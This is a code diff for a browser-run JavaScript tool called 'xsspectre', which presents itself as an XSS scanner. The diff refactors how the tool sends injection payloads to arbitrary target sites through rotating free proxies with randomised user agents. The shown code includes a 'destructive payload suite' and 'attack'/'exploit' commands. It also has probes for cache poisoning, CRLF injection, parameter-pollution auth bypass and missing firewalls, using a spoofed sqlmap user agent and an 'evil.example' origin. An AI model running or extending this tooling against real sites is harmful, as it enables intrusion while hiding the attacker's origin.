@@ -24,7 +24,7 @@
   const VERSION = MANIFEST.version;
   const GLOBAL_KEY = '__munitos_pkg_xsspectre';
 
-  const PROFILES = Object.freeze({
+const PROFILES = Object.freeze({
     high: Object.freeze({ concurrent: 384, minConcurrent: 192, maxConcurrent: 768, maxFormsToTest: 200, mainTaskLimit: 384, label: 'HIGH-POWER' }),
     low: Object.freeze({ concurrent: 48, minConcurrent: 24, maxConcurrent: 192, maxFormsToTest: 80, mainTaskLimit: 48, label: 'LOW-POWER (mobile)' })
   });
@@ -51,7 +51,7 @@
   const COMMAND = Object.freeze({
     name: PKG,
     description: 'xsspectre — unified XSS scanner.',
-    usage: `${PKG} [scan|lowscan|badai|superai|cveai|setproxy|selftest|help|info|commands|manifest|policy|version]`,
+    usage: `${PKG} [scan|lowscan|badai|superai|cveai|selftest|help|info|commands|manifest|policy|version]`,
     aliases: Object.freeze([]),
     kind: 'scanner'
   });
@@ -71,9 +71,6 @@
         dynamicWorkers: DEFAULTS.concurrent, workerAdjustments: 0,
         payloadsSkipped: 0, tasksSkipped: 0
       },
-      proxyList: [],
-      proxyReady: false,
-      customProxy: null,
       startedAt: 0,
       lastReport: null,
       winningEncodings: new Map(),
@@ -134,6 +131,32 @@
     };
 
     return { add, flushAll, finish, hasAppend };
+  };
+
+  const getFreeUserProxy = () => { try { return globalThis.__FreeUserProxy || null; } catch { return null; } };
+  const prepareProxyList = async (force = false) => {
+    const network = getFreeUserProxy()?.api?.proxy;
+    if (!network) throw new Error('FreeUserProxy is not available.');
+    if (force && typeof network.refresh === 'function') await network.refresh();
+    if (typeof network.ready === 'function') await network.ready();
+    const list = getFreeUserProxy()?.getWorkingProxies?.() || network.getWorkingProxies?.() || [];
+    if (!Array.isArray(list) || !list.length) throw new Error('No working proxies available.');
+    return list.slice();
+  };
+  const getNextProxy = (() => { let cursor = 0; return async () => { const list = await prepareProxyList(); const item = list[cursor % list.length]; cursor = (cursor + 1) % list.length; return item; }; })();
+  const pickUA = () => { try { return getFreeUserProxy()?.getRandomUserAgent?.() || getFreeUserProxy()?.api?.userAgent?.random?.() || ''; } catch { return ''; } };
+  const cmdSetProxy = async ({ args = [] } = {}) => {
+    const value = args.join(' ').trim();
+    const management = getFreeUserProxy()?.api?.management;
+    if (!management) throw new Error('FreeUserProxy management API is not available.');
+    if (!value || value === 'clear' || value === 'none') {
+      const entries = await management.list();
+      for (const entry of entries) await management.remove(entry.template);
+      return true;
+    }
+    if (!value.includes('{url}')) throw new Error('template must contain {url}');
+    await management.add('command', value);
+    return true;
   };
 
   const applyProfile = (profileName) => {
@@ -704,36 +727,16 @@
     }
   };
 
-  const getFreeUserProxy = () => {
-    try { return window.__FreeUserProxy ?? globalThis.__FreeUserProxy ?? null; } catch { return null; }
+  const getNetworkApi = () => {
+    try { return globalThis.__FreeUserProxy?.api?.proxy || null; } catch { return null; }
   };
-  const prepareProxyList = async (force = false) => {
-    if (!force && state.runtime.proxyReady && state.runtime.proxyList.length > 0) return state.runtime.proxyList;
-    const fup = getFreeUserProxy();
-    if (!fup || typeof fup.getWorkingProxies !== 'function') throw new Error('FreeUserProxy is not available.');
-    let working = [];
-    try { const w = fup.getWorkingProxies() || []; if (Array.isArray(w)) working = w.slice(); } catch { working = []; }
-    if (state.runtime.customProxy && state.runtime.customProxy.includes('{url}')) working.unshift({ name: 'custom', template: state.runtime.customProxy });
-    working = working.filter(p => p && typeof p.template === 'string' && p.template.includes('{url}'));
-    if (working.length === 0) throw new Error('FreeUserProxy returned no working proxies.');
-    state.runtime.proxyList = working;
-    state.runtime.proxyReady = true;
-    return working;
+
+  const prepareNetworkRequest = async (url, options = {}) => {
+    const network = getNetworkApi();
+    if (!network?.resolve) throw new Error('FreeUserProxy network API is not available.');
+    return network.resolve(url, options);
   };
-  let proxyCursor = 0;
-  const getNextProxy = () => {
-    if (state.runtime.proxyList.length === 0) throw new Error('NO_PROXY');
-    const p = state.runtime.proxyList[proxyCursor % state.runtime.proxyList.length];
-    proxyCursor = (proxyCursor + 1) % state.runtime.proxyList.length;
-    return p;
-  };
-  const pickUA = () => {
-    const fup = getFreeUserProxy();
-    if (fup && typeof fup.getRandomUserAgent === 'function') {
-      try { const ua = fup.getRandomUserAgent(); if (ua) return ua; } catch {}
-    }
-    return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';
-  };
+
   const normalizeHeaders = headers => {
     const out = {};
     if (!headers) return out;
@@ -766,8 +769,8 @@
       const rootUrl = `${origin}/`;
       const nfUrl = `${origin}/__xsspectre_nf_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 10)}`;
       const [root, nf] = await Promise.all([
-        fetchText(rootUrl, { timeout: timeoutMs }, 0, true).catch(() => ''),
-        fetchText(nfUrl, { timeout: timeoutMs }, 0, true).catch(() => '')
+        fetchText(rootUrl, { timeout: timeoutMs }, 0).catch(() => ''),
+        fetchText(nfUrl, { timeout: timeoutMs }, 0).catch(() => '')
       ]);
       return {
         rootHash: root ? hashText(root) : null,
@@ -853,55 +856,44 @@
     return results;
   };
 
-  const fetchWithRetry = async (url, options = {}, retries, useProxy = true) => {
-    if (state.runtime.proxyList.length === 0) await prepareProxyList();
-    const maxRetries = Number.isFinite(retries) ? retries : state.settings.retries;
+  const fetchWithRetry = async (url, options = {}, retries) => {
+    const network = getNetworkApi();
+    if (!network?.fetch) throw new Error('FreeUserProxy network API is not available.');
+    const maxRetries = Number.isFinite(retries) ? Math.max(0, retries) : state.settings.retries;
     let lastErr = null;
+    const started = performance.now();
     for (let attempt = 0; attempt <= maxRetries; attempt++) {
       try {
-        const controller = new AbortController();
-        const timeoutMs = options.timeout || state.settings.timeout;
-        const timer = setTimeout(() => controller.abort(), timeoutMs);
-        const headers = { 'User-Agent': pickUA(), Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', ...(options.headers || {}) };
-        const fetchOptions = { ...options, headers, signal: controller.signal, redirect: 'follow', credentials: 'omit', cache: 'no-store' };
-        let finalUrl = url;
-        let proxyUsed = null;
-        if (useProxy !== false) {
-          const proxy = options.proxy || getNextProxy();
-          if (proxy && proxy.template) { finalUrl = proxy.template.replace('{url}', encodeURIComponent(url)); proxyUsed = proxy; }
-        }
-        const t0 = performance.now();
-        const response = await fetch(finalUrl, fetchOptions);
-        const elapsed = performance.now() - t0;
-        clearTimeout(timer);
+        const response = await network.fetch(url, options);
+        try { Object.defineProperty(response, '__elapsed', { value: performance.now() - started, configurable: true }); } catch {}
         state.runtime.stats.requests++;
         if (response.ok || response.status < 500) state.runtime.stats.success++;
         else state.runtime.stats.failures++;
-        try {
-          Object.defineProperty(response, '__proxy', { value: proxyUsed, configurable: true });
-          Object.defineProperty(response, '__elapsed', { value: elapsed, configurable: true });
-        } catch {}
-        return response;
+        if (response.ok || response.status < 500) return response;
+        lastErr = new Error(`HTTP ${response.status || 0}`);
       } catch (err) {
         lastErr = err;
         state.runtime.stats.failures++;
-        if (attempt < maxRetries) await sleep(40 + Math.random() * 60);
       }
+      if (attempt < maxRetries) await sleep(40 + Math.random() * 60);
     }
     throw lastErr || new Error('FETCH_FAILED');
   };
-  const fetchText = async (url, options = {}, retries, useProxy = true) => {
-    const res = await fetchWithRetry(url, options, retries, useProxy);
+
+  const fetchText = async (url, options = {}, retries) => {
+    const res = await fetchWithRetry(url, options, retries);
     return res.text();
   };
-  const fetchFull = async (url, options = {}, retries, useProxy = true) => {
-    const res = await fetchWithRetry(url, options, retries, useProxy);
+
+  const fetchFull = async (url, options = {}, retries) => {
+    const res = await fetchWithRetry(url, options, retries);
     const text = await res.text();
-    return { text, status: res.status, headers: normalizeHeaders(res.headers), elapsed: res.__elapsed || 0, proxy: res.__proxy };
+    return { text, status: res.status, headers: normalizeHeaders(res.headers), elapsed: res.__elapsed || 0 };
   };
-  const fetchHeaders = async (url, options = {}, retries, useProxy = true) => {
-    const res = await fetchWithRetry(url, options, retries, useProxy);
-    return { headers: normalizeHeaders(res.headers), status: res.status, proxy: res.__proxy };
+
+  const fetchHeaders = async (url, options = {}, retries) => {
+    const res = await fetchWithRetry(url, { method: 'HEAD', ...options }, retries);
+    return { headers: normalizeHeaders(res.headers), status: res.status };
   };
 
   const detectWAF = async headers => {
@@ -1205,23 +1197,22 @@
   const testOne = async (targetUrl, form, input, payloadObj, options = {}) => {
     const req = buildRequest(targetUrl, form, input, payloadObj.payload);
     const timeoutMs = options.timeout || state.settings.timeout;
-    const headers = {
-      'User-Agent': pickUA(),
-      Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-      'Accept-Language': 'en-US,en;q=0.9',
-      ...(req.headers || {})
-    };
-
-    let finalUrl = req.url;
-    try {
-      const proxy = getNextProxy();
-      if (proxy && proxy.template) finalUrl = proxy.template.replace('{url}', encodeURIComponent(req.url));
-    } catch {}
-
+    const prepared = await prepareNetworkRequest(req.url, {
+      method: req.method,
+      headers: {
+        Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.9',
+        ...(req.headers || {})
+      },
+      body: req.body || undefined,
+      credentials: 'omit',
+      redirect: 'follow',
+      cache: 'no-store'
+    });
     const workerResult = await WorkerPool.run({
       action: 'fetch',
-      url: finalUrl,
-      options: { method: req.method, headers, body: req.body || undefined, timeout: timeoutMs },
+      url: prepared.url,
+      options: { ...prepared.options, timeout: timeoutMs },
       payload: payloadObj.payload
     });
 
@@ -1281,7 +1272,7 @@
     try {
       const u = new URL(targetUrl);
       u.searchParams.set('xsspectre_probe', marker + '<script>alert(1)</script>');
-      const res = await fetchFull(u.href, {}, 1, true);
+      const res = await fetchFull(u.href, {}, 1);
       if (res.text.includes(marker)) { evidence.push({ ok: true, text: 'Raw marker + script reflected verbatim — no input filtering' }); score += 25; }
       else evidence.push({ ok: false, text: 'Probe marker was altered or removed' });
       if (res.elapsed < 2500) { evidence.push({ ok: true, text: `Response time ${res.elapsed.toFixed(0)}ms — no rate-limit delay` }); score += 15; }
@@ -1292,9 +1283,9 @@
       else evidence.push({ ok: false, text: 'WAF challenge headers: ' + present.join(', ') });
       if (res.status >= 200 && res.status < 400) { evidence.push({ ok: true, text: `HTTP ${res.status} — request not blocked` }); score += 15; }
       else evidence.push({ ok: false, text: `HTTP ${res.status} — request may be blocked` });
-      const maliciousUA = await fetchFull(targetUrl, { headers: { 'User-Agent': 'sqlmap/1.0' } }, 1, true);
+      const maliciousUA = await fetchFull(targetUrl, { headers: { 'User-Agent': 'sqlmap/1.0' } }, 1);
       if (maliciousUA.status >= 200 && maliciousUA.status < 400) { evidence.push({ ok: true, text: 'Malicious UA (sqlmap) not blocked — no UA-based filtering' }); score += 10; }
-      const maliciousOrigin = await fetchFull(targetUrl, { headers: { 'Origin': 'https://evil.example' } }, 1, true);
+      const maliciousOrigin = await fetchFull(targetUrl, { headers: { 'Origin': 'https://evil.example' } }, 1);
       if (maliciousOrigin.status >= 200 && maliciousOrigin.status < 400) { evidence.push({ ok: true, text: 'Suspicious Origin header accepted — no origin validation' }); score += 5; }
     } catch (e) { evidence.push({ ok: false, text: 'Firewall probe failed: ' + e.message }); }
     return { score, evidence, firewallAbsent: score >= 60 };
@@ -1304,11 +1295,11 @@
     try {
       const req = buildRequest(targetUrl, form, input, payload);
       const t0 = performance.now();
-      await fetchFull(req.url, { method: req.method, headers: req.headers, body: req.body }, 0, true);
+      await fetchFull(req.url, { method: req.method, headers: req.headers, body: req.body }, 0);
       const t1 = performance.now() - t0;
       const benign = buildRequest(targetUrl, form, input, 'BENIGN_MARKER_' + Date.now());
       const t2 = performance.now();
-      await fetchFull(benign.url, { method: benign.method, headers: benign.headers, body: benign.body }, 0, true);
+      await fetchFull(benign.url, { method: benign.method, headers: benign.headers, body: benign.body }, 0);
       const t3 = performance.now() - t2;
       const diff = Math.abs(t1 - t3);
       if (diff > 300) return { hit: true, reason: `Timing delta ${diff.toFixed(0)}ms — divergent parse path` };
@@ -1318,9 +1309,9 @@
   const altMethodSize = async (targetUrl, form, input, payload) => {
     try {
       const req = buildRequest(targetUrl, form, input, payload);
-      const res = await fetchFull(req.url, { method: req.method, headers: req.headers, body: req.body }, 0, true);
+      const res = await fetchFull(req.url, { method: req.method, headers: req.headers, body: req.body }, 0);
       const benign = buildRequest(targetUrl, form, input, 'BENIGN_XYZ');
-      const res2 = await fetchFull(benign.url, { method: benign.method, headers: benign.headers, body: benign.body }, 0, true);
+      const res2 = await fetchFull(benign.url, { method: benign.method, headers: benign.headers, body: benign.body }, 0);
       const diff = Math.abs(res.text.length - res2.text.length);
       const expected = Math.abs(payload.length - 'BENIGN_XYZ'.length);
       if (diff > expected * 0.7 && diff > 5) return { hit: true, reason: `Size delta ${diff} bytes ≈ injection footprint` };
@@ -1332,7 +1323,7 @@
       const marker = 'HDR_ECHO_' + Date.now();
       const u = new URL(form.action || targetUrl);
       for (const inp of form.inputs) u.searchParams.set(inp.name, inp === input ? payload : (inp.value || ''));
-      const res = await fetchFull(u.href, { headers: { 'X-XSSpectre-Probe': marker } }, 0, true);
+      const res = await fetchFull(u.href, { headers: { 'X-XSSpectre-Probe': marker } }, 0);
       const echo = Object.keys(res.headers).filter(h => res.headers[h] && res.headers[h].includes(marker));
       if (echo.length > 0) return { hit: true, reason: 'Marker echoed in response header — header-injection surface' };
       return { hit: false, reason: 'No marker echo in response headers' };
@@ -1341,9 +1332,9 @@
   const altMethodHash = async (targetUrl, form, input, payload) => {
     try {
       const req = buildRequest(targetUrl, form, input, payload);
-      const res = await fetchFull(req.url, { method: req.method, headers: req.headers, body: req.body }, 0, true);
+      const res = await fetchFull(req.url, { method: req.method, headers: req.headers, body: req.body }, 0);
       const baseline = buildRequest(targetUrl, form, input, 'NEUTRAL_TOKEN_000');
-      const res2 = await fetchFull(baseline.url, { method: baseline.method, headers: baseline.headers, body: baseline.body }, 0, true);
+      const res2 = await fetchFull(baseline.url, { method: baseline.method, headers: baseline.headers, body: baseline.body }, 0);
       const fp = s => { let h = 0; for (let i = 0; i < Math.min(s.length, 4000); i++) h = ((h << 5) - h + s.charCodeAt(i)) | 0; return h; };
       if (fp(res.text) !== fp(res2.text)) return { hit: true, reason: 'Body hash differs — payload influenced render path' };
       return { hit: false, reason: 'Body hash identical to baseline' };
@@ -1353,7 +1344,7 @@
     try {
       const malformed = payload + '%00%FF\x00<%';
       const req = buildRequest(targetUrl, form, input, malformed);
-      const res = await fetchFull(req.url, { method: req.method, headers: req.headers, body: req.body }, 0, true);
+      const res = await fetchFull(req.url, { method: req.method, headers: req.headers, body: req.body }, 0);
       const hasServerError = res.status >= 500;
       const hasWarnings = /(warning|error|exception|stack trace|syntax error|uncaught)/i.test(res.text) && res.text.length < 5000;
       if (hasServerError || hasWarnings) return { hit: true, reason: `Server error/warning (HTTP ${res.status}) — payload reached unsanitized parser` };
@@ -1363,7 +1354,7 @@
   const altMethodCSPProbe = async (targetUrl, form, input, payload) => {
     try {
       const req = buildRequest(targetUrl, form, input, payload);
-      const res = await fetchFull(req.url, { method: req.method, headers: req.headers, body: req.body }, 0, true);
+      const res = await fetchFull(req.url, { method: req.method, headers: req.headers, body: req.body }, 0);
       const csp = res.headers['content-security-policy'] || '';
       const xssProtection = res.headers['x-xss-protection'] || '';
       const nosniff = res.headers['x-content-type-options'] || '';
@@ -1381,9 +1372,9 @@
   const altMethodCachePoison = async (targetUrl) => {
     try {
       const marker = 'CACHE_PROBE_' + Date.now();
-      await fetchFull(targetUrl, { headers: { 'X-Forwarded-Host': marker + '.evil' } }, 0, true);
+      await fetchFull(targetUrl, { headers: { 'X-Forwarded-Host': marker + '.evil' } }, 0);
       await sleep(150);
-      const second = await fetchFull(targetUrl, {}, 0, true);
+      const second = await fetchFull(targetUrl, {}, 0);
       if (second.text.includes(marker)) return { hit: true, reason: 'Cache poisoning: forwarded-host marker persisted' };
       return { hit: false, reason: 'No cache poisoning observed' };
     } catch { return { hit: false, reason: 'cache probe failed' }; }
@@ -1393,7 +1384,7 @@
       const crlfPayload = '%0d%0aX-Injected-Header: ' + Date.now();
       const u = new URL(form.action || targetUrl);
       for (const inp of form.inputs) u.searchParams.set(inp.name, inp === input ? crlfPayload : (inp.value || ''));
-      const res = await fetchFull(u.href, {}, 0, true);
+      const res = await fetchFull(u.href, {}, 0);
       const injected = Object.keys(res.headers).find(h => h.toLowerCase().startsWith('x-injected'));
       if (injected) return { hit: true, reason: 'CRLF injection: header was injected into response' };
       return { hit: false, reason: 'No CRLF header injection observed' };
@@ -1403,7 +1394,7 @@
     try {
       const u = new URL(form.action || targetUrl);
       for (const inp of form.inputs) u.searchParams.set(inp.name, inp === input ? payload + '&admin=1&role=admin' : (inp.value || ''));
-      const res = await fetchFull(u.href, {}, 0, true);
+      const res = await fetchFull(u.href, {}, 0);
       if (/admin|welcome.*admin|role.*admin/i.test(res.text.slice(0, 3000))) return { hit: true, reason: 'Possible auth bypass via parameter pollution' };
       return { hit: false, reason: 'No auth bypass signature observed' };
     } catch { return { hit: false, reason: 'auth bypass probe failed' }; }
@@ -1434,15 +1425,18 @@
           for (const p of PAYLOAD_LIB) {
             if (tasks.length >= MAX) break outer;
             const req = buildRequest(targetUrl, form, input, p.p);
-            let finalUrl = req.url;
-            try {
-              const proxy = getNextProxy();
-              if (proxy && proxy.template) finalUrl = proxy.template.replace('{url}', encodeURIComponent(req.url));
-            } catch {}
+            const prepared = await prepareNetworkRequest(req.url, {
+              method: req.method,
+              headers: { ...(req.headers || {}) },
+              body: req.body || undefined,
+              credentials: 'omit',
+              redirect: 'follow',
+              cache: 'no-store'
+            });
             tasks.push(WorkerPool.run({
               action: 'fetch',
-              url: finalUrl,
-              options: { method: req.method, headers: { 'User-Agent': pickUA(), ...req.headers }, body: req.body || undefined, timeout: state.settings.timeout },
+              url: prepared.url,
+              options: { ...prepared.options, timeout: state.settings.timeout },
               payload: p.p
             }).then(r => ({ form: form.kind, input: input.name, payload: p.id, cve: null, framework: 'Generic', note: p.note, reflected: !!(r.ok && r.reflected), status: r.status, length: r.length, url: req.url })));
           }
@@ -1481,15 +1475,18 @@
             if (!shouldRunCve(p, surface)) { skipped++; continue; }
             if (tasks.length >= MAX) break outer;
             const req = buildRequest(targetUrl, form, input, p.p);
-            let finalUrl = req.url;
-            try {
-              const proxy = getNextProxy();
-              if (proxy && proxy.template) finalUrl = proxy.template.replace('{url}', encodeURIComponent(req.url));
-            } catch {}
+            const prepared = await prepareNetworkRequest(req.url, {
+              method: req.method,
+              headers: { ...(req.headers || {}) },
+              body: req.body || undefined,
+              credentials: 'omit',
+              redirect: 'follow',
+              cache: 'no-store'
+            });
             tasks.push(WorkerPool.run({
               action: 'fetch',
-              url: finalUrl,
-              options: { method: req.method, headers: { 'User-Agent': pickUA(), ...req.headers }, body: req.body || undefined, timeout: state.settings.timeout },
+              url: prepared.url,
+              options: { ...prepared.options, timeout: state.settings.timeout },
               payload: p.p
             }).then(r => ({ form: form.kind, input: input.name, payload: p.id, cve: p.cve, framework: p.framework, note: p.note, reflected: !!(r.ok && r.reflected), status: r.status, length: r.length, url: req.url })));
           }
@@ -1521,15 +1518,18 @@
             if (!shouldRunPayload(p, surface)) { skipped++; continue; }
             if (tasks.length >= MAX) break outer;
             const req = buildRequest(targetUrl, form, input, p.p);
-            let finalUrl = req.url;
-            try {
-              const proxy = getNextProxy();
-              if (proxy && proxy.template) finalUrl = proxy.template.replace('{url}', encodeURIComponent(req.url));
-            } catch {}
+            const prepared = await prepareNetworkRequest(req.url, {
+              method: req.method,
+              headers: { ...(req.headers || {}) },
+              body: req.body || undefined,
+              credentials: 'omit',
+              redirect: 'follow',
+              cache: 'no-store'
+            });
             tasks.push(WorkerPool.run({
               action: 'fetch',
-              url: finalUrl,
-              options: { method: req.method, headers: { 'User-Agent': pickUA(), ...req.headers }, body: req.body || undefined, timeout: state.settings.timeout },
+              url: prepared.url,
+              options: { ...prepared.options, timeout: state.settings.timeout },
               payload: p.p
             }).then(r => ({ form: form.kind, input: input.name, payload: p.id, note: p.note, reflected: !!(r.ok && r.reflected), status: r.status, length: r.length, url: req.url })));
           }
@@ -1768,15 +1768,8 @@
     }
     state.runtime.visited.add(normalized);
 
-    add('Phase 2: Proxy Preparation');
-    try {
-      await prepareProxyList();
-      add('  -> Working proxies: ' + state.runtime.proxyList.length, 'success');
-    } catch (e) {
-      add('  -> Proxy error: ' + e.message, 'danger');
-      add('Scan aborted.', 'danger');
-      return finish();
-    }
+    add('Phase 2: Central Network Service');
+    add('  -> FreeUserProxy API is active; networking is centrally managed.', 'success');
 
     add('Phase 3: Baseline Fingerprinting (root + random 404)');
     const baseline = await buildBaseline(normalized, state.settings.timeout);
@@ -1791,7 +1784,7 @@
     let wafs = [];
     let headersRaw = null;
     try {
-      const res = await fetchHeaders(normalized, { method: 'HEAD' }, 1, true);
+      const res = await fetchHeaders(normalized, { method: 'HEAD' }, 1);
       wafs = await detectWAF(res.headers);
       headersRaw = res.headers;
     } catch { add('  -> HEAD failed, continuing with GET probe', 'muted'); }
@@ -1942,7 +1935,6 @@
     let normalized;
     try { normalized = normalizeTarget(target); add('Target: ' + normalized, 'success'); }
     catch (e) { add('Error: ' + e.message, 'danger'); return finish(); }
-    try { await prepareProxyList(); } catch (e) { add('Proxy error: ' + e.message, 'danger'); return finish(); }
 
     const baseline = await buildBaseline(normalized, state.settings.timeout);
     state.runtime.baseline = baseline;
@@ -2002,7 +1994,6 @@
     let normalized;
     try { normalized = normalizeTarget(target); add('Target: ' + normalized, 'success'); }
     catch (e) { add('Error: ' + e.message, 'danger'); return finish(); }
-    try { await prepareProxyList(); } catch (e) { add('Proxy error: ' + e.message, 'danger'); return finish(); }
 
     const baseline = await buildBaseline(normalized, state.settings.timeout);
     state.runtime.baseline = baseline;
@@ -2056,7 +2047,6 @@
     let normalized;
     try { normalized = normalizeTarget(target); add('Target: ' + normalized, 'success'); }
     catch (e) { add('Error: ' + e.message, 'danger'); return finish(); }
-    try { await prepareProxyList(); } catch (e) { add('Proxy error: ' + e.message, 'danger'); return finish(); }
 
     const baseline = await buildBaseline(normalized, state.settings.timeout);
     state.runtime.baseline = baseline;
@@ -2088,16 +2078,6 @@
     return finish();
   };
 
-  const cmdSetProxy = async ({ args }) => {
-    if (!args[1]) return [line('Usage: xsspectre setproxy <template-with-{url}>', 'danger')];
-    const tpl = args[1].trim();
-    if (!tpl.includes('{url}')) return [line('Invalid template. Must contain "{url}".', 'danger')];
-    state.runtime.customProxy = tpl;
-    state.runtime.proxyList = [];
-    state.runtime.proxyReady = false;
-    return [line('Custom proxy set.', 'accent'), line('Template: ' + tpl, 'muted')];
-  };
-
   const help = () => [
     line(`Package: ${MANIFEST.name}`, 'accent'),
     line(`Version: ${MANIFEST.version}`),
@@ -2110,7 +2090,6 @@
     line(`${PKG} badai <url>      Destructive payload suite`, 'muted'),
     line(`${PKG} superai <url>    Context-aware modern library`, 'orange'),
     line(`${PKG} cveai <url>      CVE-based modern library`, 'yellow'),
-    line(`${PKG} setproxy <tpl>   Set custom proxy template with {url}`, 'muted'),
     spacer(),
     line(`${PKG} info | commands | manifest | policy | selftest | version | help`, 'muted'),
     spacer(),
@@ -2140,7 +2119,6 @@
       line(`CVEAI Lib     : ${CVE_AI_PAYLOADS.length}`),
       line(`BadAI Payloads: ${BAD_AI_PAYLOADS.length}`),
       line(`Alt Methods   : ${altMethods.length}`),
-      line(`Working Proxies: ${state.runtime.proxyList.length}`)
     ];
   };
 
@@ -2194,8 +2172,8 @@
     check('line', typeof api?.line === 'function');
     check('spacer', typeof api?.spacer === 'function');
     check('Manifest identity', MANIFEST.name === PKG && MANIFEST.version === VERSION, `${MANIFEST.name} ${MANIFEST.version}`);
-    const fup = getFreeUserProxy();
-    check('FreeUserProxy', !!(fup && typeof fup.getWorkingProxies === 'function'));
+    const fup = globalThis.__FreeUserProxy || null;
+    check('FreeUserProxy API', !!(fup?.api?.proxy && fup?.api?.userAgent));
     check('Worker API', WorkerPool.available, WorkerPool.available ? 'supported' : 'fallback');
     check('Payload library', PAYLOAD_LIB.length >= 90, `${PAYLOAD_LIB.length} vectors`);
     check('CVEAI library', CVE_AI_PAYLOADS.length >= 20, `${CVE_AI_PAYLOADS.length} CVE vectors`);
@@ -2219,7 +2197,6 @@
       case 'policy': return policy();
       case 'selftest': return selfTest();
       case 'version': return version();
-      case 'setproxy': return cmdSetProxy({ args });
       case 'scan': case 'attack': case 'auto': case 'exploit': case 'verify': case 'deep': case 'chat': {
         const t = args[1];
         if (!t) return [line(`Error: ${cmd} requires a target URL.`, 'danger')];
